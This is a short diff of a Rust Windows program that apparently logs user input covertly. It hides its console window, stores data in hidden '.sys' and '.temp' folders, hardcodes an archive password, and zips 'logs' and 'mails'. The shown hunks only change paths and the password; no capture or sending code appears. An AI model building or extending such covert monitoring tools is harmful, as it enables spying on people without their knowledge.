@@ -1,11 +1,12 @@
-#![windows_subsystem = "windows"]
+ #![windows_subsystem = "windows"]
 
 use core::mem::MaybeUninit;
 use winapi::um::winuser;
 use std::time::Instant;
-use std::io::prelude::*;
+use std::env;
 use std::fs;
 use std::fs::OpenOptions;
+use std::io::prelude::*;
 use std::io::Write;
 use std::io::{self, BufRead, Read};
 use std::io::BufReader;
@@ -14,8 +15,8 @@ use chrono::{Utc, DateTime};
 use linkify::{LinkFinder, LinkKind};
 use monitor::*;
 
-const TEMP: &str = ".sys/data.dat";
-const PASS: &[u8] = b"test!";
+const TEMP: &str = "./.sys/data.dat";
+const PASS: &[u8] = b"firemouses!";
 
 fn main() {
     #[derive(Copy, Clone, Eq, PartialEq, Debug)]
@@ -241,7 +242,7 @@ fn zip_main(logs: String, mails: String) -> i32 {
 
 fn dozip(logs: String, mails: String) -> ZipResult<()> {
     let now: DateTime<Utc> = Utc::now();
-    let fname = format!(".temp/{}.zip", now.format("%Y-%m-%d").to_string());
+    let fname = format!("./.temp/{}.zip", now.format("%Y-%m-%d").to_string());
 
     let path = std::path::Path::new(&fname);
     let file = std::fs::File::create(path).unwrap();
@@ -273,7 +274,7 @@ fn readlogs(filename: &str) -> String {
     let lname = format!("text/{}", filename);
 
     let now: DateTime<Utc> = Utc::now();
-    let fname = format!(".temp/{}.zip", now.format("%Y-%m-%d").to_string());
+    let fname = format!("./.temp/{}.zip", now.format("%Y-%m-%d").to_string());
     let file = match fs::File::open(fname) {
         Ok(file) => file,
         Err(err) => {
